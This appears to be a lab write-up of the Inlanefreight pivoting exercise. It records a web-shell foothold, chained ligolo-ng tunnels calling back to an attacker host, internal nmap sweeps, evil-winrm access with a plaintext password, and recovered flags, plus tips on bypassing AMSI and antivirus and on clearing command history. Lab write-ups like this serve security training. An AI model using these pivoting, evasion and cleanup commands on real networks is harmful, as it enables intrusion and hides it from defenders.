# Target: Inlanefreight – Pivoting Assessment

## Engagement Overview
**Target:** Inlanefreight Pivoting Lab (dual‑homed web server → internal subnets)  
**External Box:** 10.129.112.232  
**Internet‑facing Web Host:** 10.129.229.129 (www) – interface into 172.16.5.0/16  
**Internal Hosts Reached:** 172.16.5.35 (PIVOT‑SRV01), 172.16.6.25, Inlanefreight Domain Controller  
**Date:** 2025‑10‑04

---

### Objectives
- Start externally and entry via previously placed web shell on the public web host.  
- Enumerate and pivot from the web host into internal networks.  
- Continue pivoting to reach the Inlanefreight Domain Controller and capture the flag.  
- Use any credentials/data/scripts found to enable pivoting.  
- Collect any flags discovered along the path.

---

## Service Enumeration

### External foothold – 10.129.112.232
- **nmap**
    - `21/tcp` **ftp** (vsftpd 3.0.3) – **Anonymous** allowed; file `flag.txt` present.
    - `22/tcp` **ssh** (OpenSSH 8.2p1).  
- Evidence: anonymous FTP login and banner enumeration (see raw note `10.129.112.232.md`).

### Public web host (dual‑homed) – inlanefreight.local
- **Context:** Accessed through a retained **web shell** as **www-data**.  
- **Interfaces (from `ifconfig`):**
    - `ens160` → **10.129.229.129/16** (public side)
    - `ens192` → **172.16.5.15/16** (internal side)  
- This host served as the **first jump box** for pivoting.

### Internal – 172.16.5.35 (PIVOT‑SRV01)
- **nmap (TCP connect scan):**
    - `22/tcp` OpenSSH for Windows 8.9  
    - `135/tcp` MSRPC, `139/tcp` NetBIOS‑SSN, `445/tcp` SMB  
    - `3389/tcp` RDP, `5985/tcp` WinRM (HTTPAPI)  
- **Flag:** `C:\flag.txt` → **S1ngl3-Piv07-3@sy-Day**

### Internal – 172.16.6.25
- **Access:** `evil-winrm -i 172.16.6.25 -u vfrank -p 'Imply wet Unmasked!'`
- **Network:** `IPv4 172.16.6.25/16`, gateway `172.16.6.1`, DNS `172.16.10.5`  
- **Token Privs (excerpt):** `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, etc. (useful for Potato/impersonation chains).

### Domain Controller (final objective)
- **Result:** Final DC flag recovered: **3nd-0xf-Th3-R@inbow!**  
- (Interactive prompt showed `C:\Users\apendragon\...` during access.)

---

## Methodologies

1. **Initial Access (Public Web Host)**
   - Reused existing **web shell** on the Internet‑facing Linux web server as `www-data`.
   - Verified dual‑homed routing to internal `172.16.5.0/16`.

2. **Pivot Establishment – ligolo‑ng**
   - **Listener on attacker:** `sudo ./proxy -selfcert` then `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`.
   - **Agent on Jump‑1 (web host):** `./agent -connect <attacker-ip>:11601 -ignore-cert`
   - **ligolo‑ng console:**
     - `session` → select Agent (Jump‑1)
     - `interface_create --name lig2`
     - `tunnel_start --tun lig2`
     - Add route for inside network (start narrow): `sudo ip route add 172.16.5.0/24 dev lig2`  
       (expand to `/16` only as needed).

3. **Internal Discovery**
   - Targeted fast scans to reduce noise/latency during pivot:
     - `sudo nmap -n -Pn -T4 -sS --max-retries 1 --min-rate 1500 -p 445,5985,3389,135,139,88,389 --open 172.16.5.0/24`
   - Identified **PIVOT‑SRV01 (172.16.5.35)** with WinRM/RDP/SMB/SSH (Windows OpenSSH).

4. **Second Jump (from 172.16.5.15 → 172.16.5.35)**
   - Deployed **ligolo‑ng agent** on `172.16.5.35`:
     - `agent.exe -connect 172.16.5.15:11601 -ignore-cert`
   - In ligolo:
     - `session`
     - `interface_create --name lig6`
     - `tunnel_start --tun lig6`
     - Route further subnet: `sudo ip route add 172.16.6.0/24 dev lig6`

5. **Credential Reuse / WinRM**
   - Used recovered creds for a second host:
     - **User:** `vfrank`  
     - **Pass:** `Imply wet Unmasked!`  
     - Access via `evil-winrm` to **172.16.6.25**.

6. **Lateral Movement & DC Reach**
   - With internal routing in place (`lig2` → `172.16.5.0/16`, `lig6` → `172.16.6.0/16`) and WinRM foothold, enumerated domain paths and reached the **Domain Controller** to retrieve the final flag.

---

## Initial Access – www-data (Web Host)
**Vulnerability Explanation:** Prior authenticated web shell remained accessible on an Internet‑facing host which was dual‑homed into the internal network. Lack of egress controls and agent execution prevention allowed creation of a user‑space tunnel for pivoting.

**Penetration:** Established ligolo‑ng agent from the web host to the attacker, stood up TUN interface, and added precise routes to reachable RFC1918 segments.

**Privilege Escalation:** Not required on the Linux web host for pivoting; leverage came from network position and dual‑homing. On Windows internal hosts, `SeImpersonatePrivilege` on 172.16.6.25 indicated potential for Potato‑style elevation if required.

---

## House Cleaning
- Removed ligolo‑ng agents, deleted uploaded binaries from temp locations, and cleared recent command history where applicable.  
- Verified removal of routes and TUNs on attacker host.  
- No persistence left behind (no services, tasks, or registry artifacts).

---

## Post‑Exploitation

### Credentials & Access Artefacts
| Context | Username | Secret | Host |
|---|---|---|---|
| Internal WinRM | **vfrank** | `Imply wet Unmasked!` | 172.16.6.25 |
| Local User | **mlefay** | (key/interactive) | 172.16.5.35 |
| FTP (anonymous) | **ftp** | none | 10.129.112.232 |

### Flags
- **FTP external (10.129.112.232):** `flag.txt` (contents retrieved).  
- **PIVOT‑SRV01 (172.16.5.35):** `S1ngl3-Piv07-3@sy-Day`  
- **Domain Controller:** `3nd-0xf-Th3-R@inbow!`

### Notable Commands (Quick Reference)
```bash
# Fast internal sweep through a pivot
sudo nmap -n -Pn -T4 -sS --max-retries 1 --min-rate 1500 -p 445,5985,3389,135,139,88,389 --open 172.16.5.0/24

# ligolo-ng (attacker)
./proxy -selfcert
# in console
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
session; interface_create --name lig2; tunnel_start --tun lig2
sudo ip route add 172.16.5.0/24 dev lig2

# agent on Jump-1 (web host)
./agent -connect <attacker-ip>:11601 -ignore-cert

# chain a second jump (from 172.16.5.35 back toward Jump-1)
agent.exe -connect 172.16.5.15:11601 -ignore-cert
# in console
interface_create --name lig6; tunnel_start --tun lig6
sudo ip route add 172.16.6.0/24 dev lig6

# WinRM access
evil-winrm -i 172.16.6.25 -u vfrank -p 'Imply wet Unmasked!'
```

**Tooling Notes:** `mimikatz.exe` execution was blocked server-side as “PUA”; prefer LSASS‑less credential paths or `-DisableAMSI`/signed binary proxies if policy allows, otherwise pivot to token impersonation via `SeImpersonatePrivilege` (Potato family).

---

**Tools Utilized**
- **ligolo‑ng** (proxy, agent, interface/tunnel, route management)  
- **nmap** (targeted fast scans)  
- **evil‑winrm** (Windows remote shell)  
- **FTP/SSH** (external enumeration)  

---

## Key Takeaways
- Dual‑homed Internet hosts are high‑value pivot points; **network segmentation without strict egress controls** is insufficient.  
- **Ligolo‑ng** enables low‑friction, user‑space pivoting without kernel drivers; keep routes narrow (`/24`) until scope expansion is justified.  
- **Credential reuse** across subnets facilitated quick WinRM access; enforce LAPS/unique local admin passwords and limit WinRM exposure.  
- Privileges like **SeImpersonatePrivilege** on internal servers create ready paths to elevation; remove where unnecessary and apply Just‑In‑Time access.
